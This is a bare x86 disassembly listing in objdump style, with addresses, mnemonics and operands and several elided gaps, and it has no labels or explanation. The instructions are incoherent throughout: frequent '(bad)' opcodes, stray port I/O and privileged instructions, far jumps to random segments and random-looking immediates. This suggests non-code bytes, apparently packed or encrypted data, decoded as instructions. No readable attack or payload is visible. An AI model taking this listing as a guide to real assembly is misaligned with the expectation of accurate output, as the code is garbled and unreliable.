  4262ad:	imul   ebp,DWORD PTR [esi-0x39],0x31c20ec
  4262b4:	mov    dl,0x33
  4262b6:	push   eax
  4262b7:	mov    edx,0x1968a30d
  4262bc:	xchg   ecx,eax
  4262bd:	fmul   QWORD PTR [ebx+0x274d9cae]
  4262c3:	test   al,0xe7
  4262c5:	pop    eax
  4262c6:	push   edi
  4262c7:	test   eax,0x432928c1
  4262cc:	cli    
  4262cd:	mov    ecx,0xa9de628f
  4262d2:	add    bh,al
  4262d4:	pop    ss
  4262d5:	mov    edx,0x326fe991
  4262da:	mov    bh,0xde
  4262dc:	clc    
  4262dd:	jecxz  0x426260
  4262df:	in     al,0x2c
  4262e1:	inc    edi
  4262e2:	pop    es
  4262e3:	adc    al,0x5a
  4262e5:	in     eax,dx
  4262e6:	rol    dl,1
  4262e8:	es xchg ebx,eax
  4262ea:	mov    ecx,0x6227b4f8
  4262ef:	mov    edi,0x70631344
  4262f4:	xor    DWORD PTR ds:0x9ca7eee1,esi
  4262fa:	fnstcw WORD PTR [ebx-0x50]
  4262fd:	xchg   DWORD PTR [esi-0x4e742fa2],edi
  426303:	add    al,0x58
  426305:	pop    edx
  426306:	adc    eax,0x422ee71c
  42630b:	out    0x9f,al
  42630d:	shl    BYTE PTR [esi+0x72e4],0x0
	...
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0x41f98b15
  426384:	stos   DWORD PTR es:[edi],eax
  426385:	cwde   
  426386:	add    DWORD PTR [eax],eax
  426388:	add    eax,0x45000001
  42638d:	inc    ebx
  42638e:	add    dl,ah
  426390:	daa    
  426391:	call   0xac24:0x24927bf4
  426398:	ds fwait
  42639a:	out    0xe6,eax
  42639c:	jb     0x4263a5
  42639e:	(bad)  
  42639f:	daa    
  4263a0:	test   DWORD PTR [ecx-0x63],esp
  4263a3:	leave  
  4263a4:	scas   al,BYTE PTR es:[edi]
  4263a5:	push   eax
  4263a6:	nop
  4263a7:	jmp    FWORD PTR [ebx-0xf]
  4263aa:	jl     0x426350
  4263ac:	cmp    dh,BYTE PTR [ebx+0x4fc62e3a]
  4263b2:	cld    
  4263b3:	or     BYTE PTR [eax+0x4742f500],ah
  4263b9:	push   ss
  4263ba:	repnz sub ah,bh
  4263bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263be:	xchg   cl,bl
  4263c0:	dec    ecx
  4263c1:	aas    
  4263c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263c3:	aad    0x35
  4263c5:	ins    DWORD PTR es:[edi],dx
  4263c6:	and    dh,ch
  4263c8:	lds    ecx,FWORD PTR [eax-0x52b9b387]
  4263ce:	cwde   
  4263cf:	aas    
  4263d0:	jmp    0xaa769012
  4263d5:	add    bl,BYTE PTR [edx+ebx*2+0x192704fb]
  4263dc:	das    
  4263dd:	inc    edx
  4263de:	xchg   BYTE PTR [eax+0x2b0c88be],al
  4263e4:	in     al,dx
  4263e5:	aas    
  4263e6:	and    eax,0xf61b5c0f
  4263eb:	push   edi
  4263ec:	(bad)  
  4263ed:	push   ds
  4263ee:	hlt    
  4263ef:	pop    DWORD PTR [eax]
  4263f1:	pop    ds
  4263f2:	mov    bh,0x7f
  4263f4:	das    
  4263f5:	inc    edi
  4263f6:	inc    ebp
  4263f7:	stos   BYTE PTR es:[edi],al
  4263f8:	xor    DWORD PTR [esi-0x55],ecx
  4263fb:	(bad)  
  4263fc:	pop    ss
  4263fd:	dec    eax
  4263fe:	out    0x6c,al
  426400:	jno    0x426453
  426402:	loop   0x426428
  426404:	sbb    DWORD PTR [edx],ebp
  426406:	div    BYTE PTR [ebx-0x1b]
  426409:	sub    al,0x75
  42640b:	xlat   BYTE PTR ds:[ebx]
  42640c:	add    al,0xd9
  42640e:	dec    esi
  42640f:	addr16 sub edi,ecx
  426412:	ror    esi,cl
  426414:	(bad)  
  426415:	rcr    BYTE PTR [edx-0x7e158651],cl
  42641b:	cs arpl bp,si
  42641e:	lods   eax,DWORD PTR ds:[esi]
  42641f:	rcl    BYTE PTR [edi-0x1f],0xb2
  426423:	ss pushf 
  426425:	in     al,dx
  426426:	fcomp  DWORD PTR [edx]
  426428:	add    ah,BYTE PTR [ebx-0x9]
  42642b:	bound  eax,QWORD PTR ds:0xde98bf13
  426431:	ror    DWORD PTR [eax+edx*2+0x6e6ea9b3],cl
  426438:	popa   
  426439:	or     eax,0xda98a7b7
  42643e:	shl    BYTE PTR [ebp+0x22a85401],1
  426444:	ds es and sp,di
  426449:	dec    ebp
  42644a:	or     eax,DWORD PTR [ebp-0x63]
  42644d:	push   ds
  42644e:	cmc    
  42644f:	and    BYTE PTR [ebx+ecx*4],al
  426452:	mov    ds:0x447b496b,eax
  426457:	into   
  426458:	std    
  426459:	dec    esi
  42645a:	data16 mov bl,0x6b
  42645d:	add    dl,BYTE PTR [edx]
  42645f:	pop    ds
  426460:	lock call 0x5f54:0x200a85c6
  426468:	cld    
  426469:	add    bh,ah
  42646b:	cmp    DWORD PTR [ecx+ecx*2+0x36ab78ea],edx
  426472:	mov    WORD PTR ds:0x74b39877,es
  426478:	jge    0x4264f5
  42647a:	test   DWORD PTR [esp+edi*1-0x17d20d59],eax
  426481:	sub    BYTE PTR [eax+0x55b37a03],ch
  426487:	mov    cl,BYTE PTR [edi+0x3f]
  42648a:	xchg   edx,eax
  42648b:	addr16 (bad) 
  42648e:	xchg   BYTE PTR [edi+0x17],ah
	...
  4264f1:	add    BYTE PTR [eax],al
  4264f3:	add    BYTE PTR [ecx+0x6f],ch
  4264f6:	mov    BYTE PTR [eax],cl
  4264f8:	mov    gs,edi
  4264fa:	jmp    0x8abb746e
  4264ff:	test   DWORD PTR [esi],esi
  426501:	xchg   edx,eax
  426502:	imul   ebp,DWORD PTR [ebx+0x199b0],0x105
  42650c:	and    esp,DWORD PTR [ebp+edi*2-0x7c274c99]
  426513:	mov    ecx,DWORD PTR ds:[ecx]
  426516:	or     eax,0xb1f35c96
  42651b:	sbb    al,0xd0
  42651d:	sub    BYTE PTR [ebx+eax*8-0x63],dl
  426521:	lds    eax,FWORD PTR [ebx-0x3]
  426524:	pop    ds
  426525:	jecxz  0x4264e5
  426527:	aam    0x3d
  426529:	mov    dh,0x32
  42652b:	scas   eax,DWORD PTR es:[edi]
  42652c:	cld    
  42652d:	xchg   DWORD PTR [esi-0x2daeedbd],esp
  426533:	sub    DWORD PTR [edx-0x36123bb9],0x11
  42653a:	push   edx
  42653b:	jmp    0x10d6b452
  426540:	push   ebp
  426541:	adc    al,0x97
  426543:	stos   BYTE PTR es:[edi],al
  426544:	sbb    dl,ah
  426546:	lahf   
  426547:	dec    esp
  426548:	jp     0x426518
  42654a:	jmp    0x34da:0xb428d24b
  426551:	push   ebp
  426552:	dec    edx
  426553:	cwde   
  426554:	cwde   
  426555:	test   BYTE PTR [esi-0x6207628b],ah
  42655b:	cmp    BYTE PTR [ebx-0x63],0x87
  42655f:	mov    ebp,0xda33e60a
  426564:	es enter 0x3189,0x62
  426569:	jne    0x426586
  42656b:	out    0xb7,al
  42656d:	inc    ecx
  42656e:	mov    edx,0x58fa2274
  426573:	cmp    dl,BYTE PTR [ecx-0x74147566]
  426579:	mov    dl,0x48
  42657b:	add    dl,BYTE PTR [esi+0x198beeb7]
  426581:	mov    al,0x16
  426583:	xor    al,0xa3
  426585:	sbb    al,0xb8
  426587:	xchg   esp,eax
  426588:	cmp    al,0xdd
  42658a:	add    ebx,DWORD PTR [edx+ebp*2]
  42658d:	xchg   ecx,eax
  42658e:	sbb    ah,BYTE PTR [ebx-0x6d]
  426591:	dec    eax
  426592:	xchg   esp,eax
  426593:	pop    esp
  426594:	pop    ebx
  426595:	or     al,0xdc
  426597:	fstp   st(4)
  426599:	xchg   BYTE PTR [esi+0xd],al
  42659c:	xor    eax,0x58167aad
  4265a1:	aam    0x10
  4265a3:	cmc    
  4265a4:	add    DWORD PTR [eax-0x5f],esi
  4265a7:	adc    eax,0xec8fdbc3
  4265ac:	addr16 xor eax,0xadfb68b8
  4265b2:	sub    al,0x81
  4265b4:	rol    BYTE PTR [ebx],cl
  4265b6:	jl     0x4265a1
  4265b8:	sbb    esi,ecx
  4265ba:	jle    0x426561
  4265bc:	dec    ecx
  4265bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4265be:	call   0xc7:0x39b653f9
  4265c5:	mov    cl,0x19
  4265c7:	daa    
  4265c8:	lea    eax,[eax+0x5478f894]
  4265ce:	mov    WORD PTR [esi],fs
  4265d0:	scas   eax,DWORD PTR es:[edi]
  4265d1:	sbb    eax,0x3930ec7
  4265d6:	cmp    eax,DWORD PTR [ecx]
  4265d8:	add    ecx,edx
  4265da:	push   esi
  4265db:	ja     0x42663a
  4265dd:	inc    esp
  4265de:	nop
  4265df:	into   
  4265e0:	out    dx,al
  4265e1:	jl     0x4265da
  4265e3:	cmp    eax,0x9049ee81
  4265e8:	jp     0x4265a4
  4265ea:	lods   al,BYTE PTR ds:[esi]
  4265eb:	lahf   
  4265ec:	inc    BYTE PTR [ecx-0x3c06765]
  4265f2:	sbb    al,0x80
  4265f4:	call   DWORD PTR [esi-0x39c60f1e]
  4265fa:	mov    ds:0x63f75dcc,al
  4265ff:	sbb    ah,ch
  426601:	mov    DWORD PTR [ebx+0x7ce35d51],0xc828fd88
  42660b:	push   ecx
  42660c:	inc    ebx
  42660d:	mov    ebx,0x45f9c1
	...
  426672:	add    BYTE PTR [eax],al
  426674:	adc    cl,bl
  426676:	sbb    DWORD PTR [edx],0xcb9b5ad9
  42667c:	pop    DWORD PTR [edi+0x2cfb6da4]
  426682:	jo     0x4266a3
  426684:	mov    ch,0x9a
  426686:	add    DWORD PTR [eax],eax
  426688:	add    eax,0xf2000001
  42668d:	pusha  
  42668e:	mov    ebp,0x248a5bf0
  426693:	(bad)  
  426695:	imul   eax,ebx,0xffffffa9
  426698:	retf   
  426699:	mov    edx,0x588a8ab0
  42669e:	jp     0x426625
  4266a0:	adc    eax,0x4a9232a1
  4266a5:	jo     0x4266ff
  4266a7:	std    
  4266a8:	or     BYTE PTR [ecx],ah
  4266aa:	arpl   WORD PTR [edi],si
  4266ac:	test   eax,0x2a09ead
  4266b1:	inc    ecx
  4266b2:	mov    edx,0x2283058a
  4266b7:	push   edx
  4266b8:	mov    bl,0xfe
  4266ba:	and    al,0x96
  4266bc:	sti    
  4266bd:	aad    0x95
  4266bf:	rol    edx,cl
  4266c1:	cdq    
  4266c2:	or     eax,0xddaeee1b
  4266c7:	or     edx,ebx
  4266c9:	fbld   TBYTE PTR [eax+0x3e]
  4266cc:	dec    ebp
  4266cd:	pushf  
  4266ce:	pop    edi
  4266cf:	adc    ebx,DWORD PTR [esi]
  4266d1:	cmp    eax,0x8dfeab1a
  4266d6:	jbe    0x426659
  4266d8:	mov    ebx,0x43f1802d
  4266dd:	adc    al,0x77
  4266df:	pop    ebp
  4266e0:	test   BYTE PTR ds:0x28ee6b16,cl
  4266e6:	adc    eax,0x9d018d91
  4266eb:	mov    esp,0xd31772ae
  4266f0:	mov    BYTE PTR [eax],ah
  4266f2:	inc    ebp
  4266f3:	lahf   
  4266f4:	jmp    0x42674e
  4266f6:	aad    0x7
  4266f8:	ins    BYTE PTR es:[edi],dx
  4266f9:	aas    
  4266fa:	fistp  WORD PTR [ebx]
  4266fc:	jmp    0x19bf9468
  426701:	lahf   
  426702:	(bad)  
  426703:	mov    ds:0x62e09ef6,al
  426708:	xchg   ebx,eax
  426709:	call   0x2c14e588
  42670e:	enter  0xb52e,0x59
  426712:	out    0x4f,al
  426714:	add    eax,0xacae9751
  426719:	out    0xe7,al
  42671b:	sahf   
  42671c:	idiv   dl
  42671e:	rol    BYTE PTR [edx-0x64cd3fb7],1
  426724:	mov    ch,0xa4
  426726:	lahf   
  426727:	icebp  
  426728:	neg    edi
  42672a:	push   esi
  42672b:	or     ecx,DWORD PTR [ebx-0x371551ea]
  426731:	sar    BYTE PTR [ebx-0x56],1
  426734:	xchg   edx,eax
  426736:	enter  0x1f00,0x69
  42673a:	addr16 mov esp,0x2bb4f2a8
  426740:	fsubr  DWORD PTR [ebx+0x3c4eb634]
  426746:	pop    ss
  426747:	and    DWORD PTR [ebp+0x11cfc940],edx
  42674d:	ins    DWORD PTR es:[edi],dx
  42674e:	lahf   
  42674f:	loopne 0x42672d
  426751:	and    al,0x72
  426753:	es out 0x5f,al
  426756:	inc    edi
  426757:	dec    edx
  426758:	outs   dx,DWORD PTR ds:[esi]
  426759:	xor    ebp,DWORD PTR [edi+esi*4]
  42675c:	dec    edi
  42675d:	sbb    dl,ch
  42675f:	in     eax,dx
  426760:	xchg   edi,eax
  426761:	xlat   BYTE PTR ds:[ebx]
  426762:	repnz setl BYTE PTR [edi]
  426766:	lahf   
  426767:	mov    bl,0xf9
  426769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42676a:	dec    esp
  42676b:	ret    0x220b
  42676e:	xchg   ebp,eax
  42676f:	inc    esp
  426770:	pop    es
  426771:	fmul   QWORD PTR [ebp+0x5e]
  426774:	jbe    0x426767
  426776:	(bad)  
  426777:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426778:	add    ebp,ecx
  42677a:	mov    bl,0x3b
  42677c:	lahf   
  42677d:	inc    ecx
  42677e:	and    esp,eax
  426780:	push   ebx
  426781:	loopne 0x42678a
  426783:	ja     0x426728
  426785:	mov    al,ds:0xde8f3a0f
  42678a:	jbe    0x426787
  42678c:	mov    eax,ds:0xa2e2b07c
	...
  4267f1:	add    BYTE PTR [eax],al
  4267f3:	add    BYTE PTR [eax-0xd53173],bh
  4267f9:	imul   edi,esp,0xffffff9f
  4267fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267fd:	and    dh,0xca
  426800:	pop    esi
  426801:	xchg   dl,al
  426803:	cwde   
  426804:	mov    edx,0x500019b
  426809:	add    DWORD PTR [eax],eax
  42680b:	add    al,ah
  42680d:	xor    BYTE PTR [eax+0x20cb4b15],0x0
  426814:	adc    al,0xc7
  426816:	fstp   QWORD PTR [bp+si+0x17]
  42681a:	push   cs
  42681b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42681c:	push   ebx
  42681d:	mov    dh,al
  42681f:	lahf   
  426820:	or     DWORD PTR [esi],esp
  426822:	mov    dh,0xc6
  426824:	jp     0x426892
  426826:	xor    esi,DWORD PTR [eax+0x5b074a15]
  42682c:	pop    edi
  42682d:	mov    cl,0x2c
  42682f:	aad    0x87
  426831:	mov    esp,DWORD PTR [ebx+eax*2+0x15]
  426835:	cmp    al,0x5
  426837:	mov    bh,0xcb
  426839:	hlt    
  42683a:	adc    ebp,esi
  42683c:	ins    DWORD PTR es:[edi],dx
  42683d:	stos   DWORD PTR es:[edi],eax
  42683e:	or     ah,cl
  426840:	lock and eax,0x3ca97dfb
  426846:	or     esp,DWORD PTR [edi-0x69]
  426849:	mov    bl,al
  42684b:	(bad)  
  42684d:	or     DWORD PTR [eax-0x4c],0xffffffea
  426851:	leave  
  426852:	into   
  426853:	je     0x4267e5
  426855:	aas    
  426856:	cwde   
  426857:	dec    ebp
  426858:	aaa    
  426859:	cmp    edx,esi
  42685b:	imul   ebp,esi,0x4c
  42685e:	or     DWORD PTR [eax],eax
  426860:	hlt    
  426861:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426862:	loopne 0x4267f8
  426864:	inc    esp
  426865:	pop    esp
  426866:	mov    ah,0x13
  426868:	mov    ds:0xa0e1df08,eax
  42686d:	inc    esi
  42686e:	aam    0xb0
  426870:	in     al,0x52
  426872:	stos   DWORD PTR es:[edi],eax
  426873:	sub    BYTE PTR [edi],ch
  426875:	sbb    ch,ah
  426877:	xor    al,0xfd
  426879:	shr    DWORD PTR [esi+0x61],1
  42687c:	cli    
  42687d:	fdiv   st(7),st
  42687f:	aad    0x12
  426881:	push   ecx
  426882:	add    BYTE PTR [edi+0x58],0x9a
  426886:	mov    DWORD PTR [esi+0x4d],ecx
  426889:	dec    edi
  42688a:	fsubr  st(1),st
  42688c:	inc    ebp
  42688d:	mov    al,0x10
  42688f:	xchg   esp,eax
  426890:	stos   DWORD PTR es:[edi],eax
  426891:	cdq    
  426892:	or     bh,dl
  426894:	sub    DWORD PTR [ebx+ebp*1],esp
  426897:	sub    edx,eax
  426899:	repnz xor bl,BYTE PTR [eax-0x37]
  42689d:	mov    edx,0x84947dfc
  4268a2:	sub    ecx,DWORD PTR [ecx+0x4c554ea0]
  4268a8:	pop    edi
  4268a9:	fdiv   st(3),st
  4268ab:	inc    esp
  4268ac:	jnp    0x4268b6
  4268ae:	push   ebp
  4268af:	push   ebp
  4268b0:	fdivrp st(2),st
  4268b2:	aaa    
  4268b3:	pop    esp
  4268b4:	and    ch,ch
  4268b6:	sbb    cl,BYTE PTR [ebp+0x22530893]
  4268bc:	inc    edx
  4268bd:	push   eax
  4268be:	push   ss
  4268bf:	cli    
  4268c0:	sbb    BYTE PTR [edx+ebx*8+0x1913256],cl
  4268c7:	inc    eax
  4268c8:	jnp    0x4268ea
  4268ca:	in     eax,0xfc
  4268cc:	or     eax,DWORD PTR [esp-0x29]
  4268d0:	test   BYTE PTR [edx],cl
  4268d2:	pushf  
  4268d3:	loope  0x426868
  4268d5:	test   ebx,esi
  4268d7:	call   0x87559f2b
  4268dc:	fsub   DWORD PTR [ebx+0x66998d6d]
  4268e2:	and    BYTE PTR [eax],ah
  4268e4:	nop
  4268e5:	push   ebx
  4268e6:	sbb    al,0xd4
  4268e8:	sahf   
  4268e9:	adc    al,0x70
  4268eb:	out    dx,al
  4268ec:	ss clc 
  4268ee:	loop   0x426906
  4268f0:	rcl    BYTE PTR [esi+0x12b1647d],cl
  4268f6:	sub    edi,DWORD PTR [eax+ebp*4]
  4268f9:	ins    DWORD PTR es:[edi],dx
  4268fa:	js     0x426895
  4268fc:	test   DWORD PTR [esp+ebx*2],esp
  4268ff:	daa    
  426900:	mov    gs,WORD PTR [edx+0x3f46cad9]
  426906:	jecxz  0x42692c
  426908:	mov    ah,bl
  42690a:	cmp    eax,0x99eee32c
  42690f:	push   ebp
  426910:	ja     0x426912
	...
  426972:	add    BYTE PTR [eax],al
  426974:	mov    WORD PTR [esi+0x7d],cs
  426977:	jge    0x426978
  426979:	jg     0x426907
  42697b:	jmp    FWORD PTR [ebx]
  42697d:	in     al,dx
  42697e:	lahf   
  42697f:	mov    ebp,DWORD PTR [edi]
  426981:	ret    0x807e
  426984:	mov    edi,0x500019c
  426989:	add    DWORD PTR [eax],eax
  42698b:	add    BYTE PTR ds:0x5db901d4,bh
  426991:	out    0x63,eax
  426993:	push   ecx
  426994:	push   ebp
  426995:	inc    ebp
  426996:	movups xmm0,XMMWORD PTR [edi-0x2b67c49f]
  42699d:	mov    eax,0xbc6e6fa7
  4269a2:	pushf  
  4269a3:	fadd   QWORD PTR [ebp+0x225791b7]
  4269a9:	mov    al,0xc9
  4269ab:	int3   
  4269ac:	retf   0x253c
  4269af:	xchg   ebx,eax
  4269b0:	outs   dx,BYTE PTR ds:[esi]
  4269b1:	add    DWORD PTR [edx-0x2a933dfd],esp
  4269b7:	std    
  4269b8:	(bad)  
  4269b9:	push   cs
  4269ba:	mov    ?,ecx
  4269bc:	mov    edx,0xd323844a
  4269c1:	inc    esi
  4269c2:	xor    BYTE PTR [eax-0x4d],ah
  4269c5:	retf   
  4269c6:	repnz mov BYTE PTR [eax],bh
  4269c9:	rcr    BYTE PTR [edi+0xd7953e3],cl
  4269cf:	imul   ebp,DWORD PTR [ebp-0x6d6ac5],0x859f2bf9
  4269d9:	add    eax,0x614cbf4a
  4269de:	out    0x35,eax
  4269e0:	push   ecx
  4269e1:	sbb    BYTE PTR [edx+0x4],cl
  4269e4:	(bad)  
  4269e5:	fnstcw WORD PTR [esp+edi*4-0x46]
  4269e9:	(bad)  
  4269ea:	data16 rcr BYTE PTR [edi+0x67],cl
  4269ee:	mov    eax,edx
  4269f0:	shld   DWORD PTR [edx+0x8],ebx,0x5b
  4269f5:	(bad)  
  4269f6:	xor    al,0xde
  4269f8:	jmp    0x426a15
  4269fa:	push   esp
  4269fb:	jae    0x4269b4
  4269fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269fe:	cs enter 0xad2e,0x8f
  426a03:	or     esi,DWORD PTR [edi-0x7b29b3fd]
  426a09:	adc    al,0x4e
  426a0b:	dec    edi
  426a0c:	std    
  426a0d:	push   eax
  426a0e:	xor    DWORD PTR [ebp+0x55009ad],ecx
  426a14:	loope  0x4269d6
  426a16:	xchg   esp,eax
  426a17:	pop    ebx
  426a18:	or     BYTE PTR [esi+edi*8],0xd3
  426a1c:	and    DWORD PTR [edx],eax
  426a1e:	call   0x906a:0x50ace408
  426a25:	sti    
  426a26:	add    eax,0x4bc6058e
  426a2b:	add    ch,BYTE PTR [ebx]
  426a2d:	mov    BYTE PTR [ecx+edx*1],al
  426a30:	(bad)  
  426a31:	fcomip st,st(0)
  426a33:	sbb    ebx,0xfffffffa
  426a36:	xlat   BYTE PTR ds:[ebx]
  426a37:	aad    0x7d
  426a39:	xchg   ebp,eax
  426a3a:	ret    0x4e20
  426a3d:	imul   edi,DWORD PTR [edx+edi*1],0x3eb7e95b
  426a44:	fdivr  st(1),st
  426a46:	mov    bh,0x45
  426a48:	jo     0x426a45
  426a4a:	sbb    al,0xa4
  426a4c:	pop    es
  426a4d:	mov    ds:0x404e98fe,al
  426a52:	(bad)  
  426a54:	mov    ah,0x32
  426a56:	mov    bl,0x75
  426a58:	loopne 0x426a41
  426a5a:	(bad)  
  426a5b:	mov    edx,0xe5c87ca9
  426a60:	dec    BYTE PTR [ecx-0x59517927]
  426a66:	cs push esp
  426a68:	fiadd  DWORD PTR [ebp+0x38]
  426a6b:	fucomip st,st(6)
  426a6d:	ret    
  426a6e:	add    BYTE PTR ds:0x461f16bf,0x57
  426a75:	push   edx
  426a76:	push   edx
  426a77:	ror    BYTE PTR [ebx],cl
  426a79:	inc    ebx
  426a7a:	mov    ecx,0x922c10db
  426a7f:	cs pop ebp
  426a81:	loop   0x426a8a
  426a83:	popa   
  426a84:	test   al,0xaf
  426a86:	sar    DWORD PTR [edi+edi*4],cl
  426a89:	xchg   edi,eax
  426a8a:	in     eax,0xdf
  426a8c:	pop    ecx
  426a8d:	push   edx
  426a8e:	imul   eax,DWORD PTR [ebx],0xffffffa5
	...
  426af1:	add    BYTE PTR [eax],al
  426af3:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  426af9:	ja     0x426ad6
  426afb:	out    dx,eax
  426afc:	inc    esi
  426afd:	sub    DWORD PTR [esi],edi
  426aff:	or     al,0x81
  426b01:	ins    BYTE PTR es:[edi],dx
  426b02:	mov    eax,ds:0x19dc41b
  426b07:	add    BYTE PTR ds:0x49000001,al
  426b0d:	lea    ebx,[esi+ebx*2]
  426b10:	dec    esi
  426b11:	icebp  
  426b12:	(bad)  
  426b13:	dec    ebx
  426b14:	xchg   edi,eax
  426b15:	in     al,0xfd
  426b17:	loope  0x426b97
  426b19:	aad    0x20
  426b1b:	nop
  426b1c:	adc    esp,DWORD PTR [esi+edx*8+0x22]
  426b20:	push   esp
  426b21:	pushf  
  426b22:	mov    ds:0xa635db43,eax
  426b27:	dec    ecx
  426b28:	gs xchg esi,eax
  426b2a:	pop    ss
  426b2b:	jl     0x426ab3
  426b2d:	dec    edi
  426b2e:	cmp    al,0xa4
  426b30:	jae    0x426b8e
  426b32:	outs   dx,BYTE PTR ds:[esi]
  426b33:	add    ah,bh
  426b35:	push   esi
  426b36:	and    ah,cl
  426b38:	mov    WORD PTR [ebx],ss
  426b3a:	mov    eax,0x632417fd
  426b3f:	loopne 0x426b4c
  426b41:	xchg   BYTE PTR [edx+ecx*8+0x38259805],al
  426b48:	scas   al,BYTE PTR es:[edi]
  426b49:	and    bl,ch
  426b4b:	xchg   edi,eax
  426b4c:	push   0xd
  426b4e:	es int3 
  426b50:	pop    ds
  426b51:	jg     0x426b96
  426b53:	nop
  426b54:	js     0x426b92
  426b56:	(bad)  
  426b57:	stc    
  426b58:	xchg   ecx,eax
  426b59:	ficomp DWORD PTR [esp+esi*1+0x72]
  426b5d:	fst    QWORD PTR [ebx-0x75b61d97]
  426b63:	mov    al,0xd0
  426b65:	(bad)  
  426b67:	pop    esi
  426b68:	xor    eax,0xe4d9fd43
  426b6d:	out    dx,al
  426b6e:	cmp    al,0xd8
  426b70:	scas   eax,DWORD PTR es:[edi]
  426b71:	jo     0x426bb6
  426b73:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  426b75:	xor    BYTE PTR [ebp+0x3e60566e],0xab
  426b7c:	lods   eax,DWORD PTR ds:[esi]
  426b7d:	cmp    eax,0x34f6b0d9
  426b82:	(bad)  
  426b83:	xor    ebx,DWORD PTR [ebp-0x69]
  426b86:	les    ebx,FWORD PTR [ebp+0xb7f60d9]
  426b8c:	in     eax,dx
  426b8d:	nop
  426b8e:	mov    ebx,0xc792577e
  426b93:	mov    ecx,0x1ffc0c3c
  426b98:	or     DWORD PTR [eax+eax*2-0x72ff2b9],0x6dd43c70
  426ba3:	inc    edx
  426ba4:	sub    edx,DWORD PTR [edi]
  426ba6:	out    0x1a,al
  426ba8:	jb     0x426b5f
  426baa:	dec    edx
  426bab:	cs ret 
  426bad:	xchg   ebx,eax
  426bae:	and    edx,DWORD PTR [ebx]
  426bb0:	int    0x5e
  426bb2:	out    dx,eax
  426bb3:	or     al,0x50
  426bb5:	inc    eax
  426bb6:	fdivr  st(4),st
  426bb8:	xorps  xmm2,XMMWORD PTR [edx+eiz*8-0x12]
  426bbd:	leave  
  426bbe:	sbb    eax,0x854c301c
  426bc3:	pop    ebx
  426bc4:	pop    es
  426bc5:	add    al,0x51
  426bc7:	lods   eax,DWORD PTR ds:[esi]
  426bc8:	xchg   ebp,eax
  426bc9:	arpl   WORD PTR [ecx],ax
  426bcb:	inc    edi
  426bcc:	int    0x8f
  426bce:	xchg   edi,eax
  426bcf:	mov    ch,0xcf
  426bd1:	pop    ebx
  426bd2:	hlt    
  426bd3:	push   ebp
  426bd4:	cmp    ah,dl
  426bd6:	mov    al,bh
  426bd8:	les    ebx,FWORD PTR gs:[ecx]
  426bdb:	xchg   esi,eax
  426bdc:	push   edi
  426bdd:	shl    cl,1
  426bdf:	jmp    0xd27c:0xf894d98d
  426be6:	cmc    
  426be7:	inc    esi
  426be8:	out    0x85,eax
  426bea:	inc    esi
  426beb:	stc    
  426bec:	in     eax,0x6d
  426bee:	push   edi
  426bef:	imul   BYTE PTR [ecx]
  426bf1:	jnp    0x426c3f
  426bf3:	adc    DWORD PTR [eax-0x42dec3ed],ebp
  426bf9:	and    esi,edi
  426bfb:	lea    edx,[ecx]
  426bfd:	js     0x426c44
  426bff:	xchg   ebp,eax
  426c00:	push   edi
  426c01:	mov    al,ds:0x4bd2fa49
  426c06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c07:	sahf   
  426c08:	fidivr DWORD PTR [ebp-0x1b714fcc]
  426c0e:	cwde   
  426c0f:	push   edx
  426c10:	pop    DWORD PTR [eax]
	...
  426c72:	add    BYTE PTR [eax],al
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0xf96fda31
  426c84:	leave  
  426c85:	sahf   
  426c86:	add    DWORD PTR [eax],eax
  426c88:	add    eax,0xbb000001
  426c8d:	mov    al,ds:0x3226d474
  426c92:	sub    ah,BYTE PTR [ebx-0x6e]
  426c95:	xchg   BYTE PTR [eax+ebp*4+0x1c],cl
  426c99:	dec    ecx
  426c9a:	xor    eax,0x45bbab9a
  426c9f:	int    0x3b
  426ca1:	mov    bh,0x89
  426ca3:	rol    BYTE PTR [eax-0x94ce8e9],cl
  426ca9:	pop    ebp
  426caa:	fs add ah,cl
  426cad:	mov    ch,0x32
  426caf:	call   DWORD PTR [edi+edi*4]
  426cb2:	(bad)  
  426cb3:	jmp    0x82ae:0xf5b1459a
  426cba:	mov    ch,0xf3
  426cbc:	inc    esi
  426cbd:	gs pushf 
  426cbf:	xchg   esp,eax
  426cc0:	fsub   QWORD PTR [ebx+0x88405ea]
  426cc7:	gs mov cl,0xe1
  426cca:	les    eax,FWORD PTR [edi]
  426ccc:	cld    
  426ccd:	in     eax,0xa1
  426ccf:	inc    ebp
  426cd0:	shl    BYTE PTR [edi],cl
  426cd2:	mov    ds:0x3ad12f31,eax
  426cd7:	popa   
  426cd8:	pop    edi
  426cd9:	enter  0x1beb,0xbe
  426cdd:	xor    edx,edx
  426cdf:	push   esi
  426ce0:	mov    BYTE PTR [esi],ch
  426ce2:	xor    ecx,ecx
  426ce4:	adc    DWORD PTR [bx+si+0x4282],esp
  426ce9:	sub    dh,BYTE PTR [edx-0x74]
  426cec:	imul   BYTE PTR [edx+ecx*2+0x24]
  426cf0:	dec    ecx
  426cf1:	mov    al,0x9f
  426cf3:	push   ecx
  426cf4:	fucomp st(7)
  426cf6:	adc    DWORD PTR [edx],edx
  426cf8:	sahf   
  426cf9:	call   0x1704:0xc08c5d9d
  426d00:	js     0x426d25
  426d02:	int    0xc3
  426d04:	call   0x8195:0x4e750d3e
  426d0b:	xchg   esp,eax
  426d0c:	xchg   esp,eax
  426d0d:	jbe    0x426d8e
  426d0f:	int    0xf
  426d11:	fimul  WORD PTR [edx+0xc]
  426d14:	ja     0x426d70
  426d16:	push   ds
  426d17:	or     bh,BYTE PTR [esi]
  426d19:	not    DWORD PTR [ecx]
